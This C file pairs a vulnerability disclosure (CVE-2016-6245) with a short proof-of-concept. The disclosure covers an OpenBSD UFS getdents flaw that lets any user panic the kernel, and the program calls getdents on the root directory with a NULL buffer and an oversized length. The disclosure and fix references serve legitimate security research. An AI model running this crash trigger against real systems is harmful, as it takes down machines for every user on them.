/*
 * ufs_getdents_panic.c
 *    Demonstrate a panic in UFS through the getdents system call.
 *
 * gcc -g ufs_getdents_panic.c -o ufs_getdents_panic
 */

#ifdef BUG_WRITEUP //---------------------------------------------------
Any user can panic the kernel with the getdents call with a large buffer size

Impact:
Any user can panic the kernel if they can access any directories
of a UFS filesystem.

Description:
When processing the getdents system call, the UFS filesystem
allocates a buffer with a size provided by the caller.  This
size can be any value less than INT_MAX, and need not correspond
to an actual buffer held by the caller.  By providing an overly
large size, a caller can trigger a panic in the kernel
of "malloc: allocation too large" or "out of space in kmem_map".

This issue is triggered by an allocation in ufs_readdir():

    diskbuf = malloc(readcnt, M_TEMP, M_WAITOK);

here readcnt originates with the buffer length to the getdents
call, which was placed in the uio_resid field:

    count = uio->uio_resid;
    entries = (uio->uio_offset + count) & (DIRBLKSIZ - 1);

    /* Make sure we don't return partial entries. */
    if (count <= entries)
        return (EINVAL);

    /*
     * Convert and copy back the on-disk struct direct format to
     * the user-space struct dirent format, one entry at a time
     */

    /* read from disk, stopping on a block boundary, max 64kB */
    readcnt = max(count, 64*1024) - entries;

This condition can be triggered by any user who can read a
directory on a UFS filesystem.

Reproduction:
Run the attached ufs_getdents_panic.c program. It will pass call
getdents with a NULL buffer and a large size, that will trigger
a panic such as 'panic: malloc: allocation too large, type = 127, 
size = 1879048192'. NCC Group was able to reproduce this issue
on OpenBSD 5.9 release running amd64.

Recommendation:
Limit the readcnt in ufs_readdir() to an ammount that is
reasonable to allow an allocation for.

Reported: 2016-07-12
Fixed:    http://cvsweb.openbsd.org/cgi-bin/cvsweb/src/sys/ufs/ufs/ufs_vnops.c.diff?r1=1.128&r2=1.129
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.9/common/015_dirent.patch.sig
          http://ftp.openbsd.org/pub/OpenBSD/patches/5.8/common/019_dirent.patch.sig
Assigned: CVE-2016-6245
#endif // BUG_WRITEUP ---------------------------------------------------

#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <dirent.h>

void xperror(int cond, char *msg)
{
    if(cond) {
        perror(msg);
        exit(1);
    }
}

int main(int argc, char **argv)
{
    int fd, x;

    fd = open("/", O_RDONLY);
    xperror(fd == -1, "/");

    x = getdents(fd, 0, 0x70000000);
    xperror(x == -1, "getdents");

    printf("no crash!\n");
    return 0;
}

